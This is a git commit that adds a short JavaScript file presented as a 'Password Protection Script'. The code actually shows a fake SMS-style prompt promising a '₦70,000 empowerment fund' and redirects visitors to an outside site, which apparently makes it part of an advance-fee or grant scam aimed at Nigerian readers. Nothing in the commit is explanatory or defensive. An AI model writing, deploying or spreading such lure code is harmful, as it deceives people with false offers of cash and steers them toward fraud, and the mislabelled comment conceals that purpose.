64f6f704b77c3077e33db0996c9f8aedfe3ed915
itidnewblog1 <newblog1itid@gmail.com>
2025-10-28 08:00:48 +0100

    Create fg-active.js

---
+++ fg-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '₦70,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the ₦70,000 NIYEEDEP EMPOWERMENT FUND. Please press OK to GET CASH now.',
+  '₦70,000'
+);
+if (password != '₦70,000') {
+  location.href = 'https://rhward.org/nigerian.html';
+}
